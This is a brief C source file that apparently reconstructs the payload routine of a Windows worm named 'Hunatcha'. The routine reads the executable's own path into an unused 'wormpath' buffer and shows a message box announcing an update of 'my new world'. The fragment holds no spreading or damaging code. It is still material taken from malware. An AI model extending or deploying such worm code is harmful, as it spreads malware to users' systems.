#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _Payload(void)
{
    volatile struct _LocalCtx {
        char wormpath[MAX_PATH];
        char msg[MAX_PATH];
    } ctx;

    GetModuleFileNameA(NULL, ctx.wormpath, MAX_PATH);
    // (ctx.wormpath is unused, as in original)

    strcpy(ctx.msg, "Your system need to update my new world...");
    MessageBoxA(NULL, ctx.msg, "Hunatcha Informer", MB_ICONINFORMATION);
}
#pragma optimize("", on)
